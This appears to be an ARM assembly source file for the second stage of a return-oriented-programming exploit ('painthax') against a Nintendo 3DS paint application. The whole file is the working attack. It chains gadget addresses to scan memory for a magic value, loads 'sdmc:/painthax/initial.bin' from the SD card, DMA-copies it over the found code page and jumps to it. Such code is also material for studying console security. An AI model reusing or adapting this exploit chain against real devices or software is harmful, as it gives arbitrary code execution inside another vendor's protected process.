.nds

.include "paint_constants.s"
.include "paint_macros.s"

.create "../build/rop_stage2.bin",LINEAR_THREAD_TAKEOVER_PTR+ROP_STAGE2_OFFSET

deref_to_r0_and_add PAINT_APPMEMTYPE_PTR, 0x100000000 - 0x6 ; get appmemtype if it's equal to 6 then r0=0
compare_r0_0 ; if appmemtype==6 (N3DS)

store_to_addr_if_equal loop_src, 0x30000000 + 0x07C00000 - PAINT_MAX_CODEBIN_SIZE

.area 0xDC ; because sub sp, sp, 0xDC
scan_loop:

  .word PAINT_GXTRYENQUEUE_WRAPPER
    .word 0x4
    loop_src:
      .word 0x30000000 + 0x04000000 - PAINT_MAX_CODEBIN_SIZE ; src overwritten
    loop_dst:
      .word LINEAR_BUFFER ; dest
    .word PAINT_SCANLOOP_STRIDE
    .word 0xFFFFFFFF
    .word 0xFFFFFFFF
    .word 0x8
    .word 0x0

    .word 0x0

    .word fix_loop ; r4 used later
    fix_loop:
    .word scan_loop
    .word 0xDEADC0DE
    .word loop_pivot-0x4

  .word ROP_PAINT_POP_R0PC
    .word 100*1000
  .word PAINT_SVC_SLEEPTHREAD_WRAPPER ; /!\ r4 has to point to value > 1
                                      ; at the end ldr r0, [r4], load scan_loop into r0
    .word 0xDEADC0DE
    .word ROP_PAINT_NOP ; r5 used later if magicval found
    .word 0xDEADC0DE

  .word ROP_PAINT_POP_R1PC
    .word PAINT_GXTRYENQUEUE_WRAPPER
  .word ROP_PAINT_STR_R1R0_POP_R4PC ; store PAINT_GXTRYENQUEUE_WRAPPER to scan_loop
    .word loop_dst ; r4 for next gadget

  .word ROP_PAINT_LDR_R0R4_POP_R4PC
    .word 0xDEADC0DE
  .word ROP_PAINT_LDR_R0R0_POP_R4PC
    .word 0x100000000 - PAINT_MAGICVAL
  .word ROP_PAINT_ADD_R0_R0R4_POP_R4PC
    .word 0xDEADC0DE
  compare_r0_0

  .word ROP_PAINT_POP_R3PC
    .word ROP_PAINT_STREQ_R5R2_4_POP_R4R5R6PC
  .word ROP_PAINT_MOV_R2R7_MOV_R1R5_BLX_R3
    .word loop_src ; r4 for next gadget
    .word 0xDEADC0DE
    .word 0xDEADC0DE

  .word ROP_PAINT_LDR_R0R4_POP_R4PC
    .word PAINT_SCANLOOP_STRIDE
  .word ROP_PAINT_ADD_R0_R0R4_POP_R4PC
    .word loop_src
  .word ROP_PAINT_STR_R0R4_POP_R4PC
    .word loop_dst ; r4 for next gadget

  .word ROP_PAINT_LDR_R0R4_POP_R4PC
    .word 0x20
  .word ROP_PAINT_ADD_R0_R0R4_POP_R4PC
    .word loop_dst
  .word ROP_PAINT_STR_R0R4_POP_R4PC
    .word 0xDEADC0DE

  .word ROP_PAINT_POP_R0PC
    .word gadget_nop_min_40 ; set r0 for next gadget so it jumps to ROP_PAINT_NOP

  .word ROP_PAINT_NOP
  .word ROP_PAINT_NOP

  loop_pivot:
  .word ROP_PAINT_SUB_SPSP_DC_LDR_R1R0_LDR_R3R1_40_MOV_R1R2_BLX_R3
  ; only real reliable way to sub sp
  ; jump to ROP_PAINT_NOP after sub sp

loop_end:

.endarea

deref_to_r0_and_add loop_src, 0x100000000 - PAINT_SCANLOOP_STRIDE; loop_src is incremented after the magicval is found, so we decrement it, then it points the the good page
store_r0_to final_dst

FS_MountSdmc PAINT_SDMC_STRING
FS_TryOpenFile context, file_path, FSFILE_READ
FS_TryGetSize context, file_size
FS_TryReadFile context, 0, 0, bytes_read, file_size, LINEAR_BUFFER

flush_dcache LINEAR_BUFFER, 0x100000
.word PAINT_GXTRYENQUEUE_WRAPPER
  .word 0x4
  .word LINEAR_BUFFER ; src
  final_dst:
    .word 0xDEADC0DE ; dest overwritten
  .word 0x2000
  .word 0xFFFFFFFF
  .word 0xFFFFFFFF
  .word 0x8
  .word 0x0

  .word 0x0

  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE
  .word 0xDEADC0DE

sleep 200*1000*1000, 0

.word INITIAL_PAYLOAD_VA

gadget_nop_min_40:
  .word gadget_nop-0x40

gadget_nop:
  .word ROP_PAINT_NOP

file_size:
  .word 0x0
  .word 0x0

bytes_read:
  .word 0x0

context:
  .word 0x0
  .word 0x0
  .word 0x0
  .word 0x0
  .word 0x0
  .word 0x0
  .word 0x0
  .word 0x0

.loadtable "string16.tbl"
file_path:
  .string "sdmc:/painthax/initial.bin"

.close
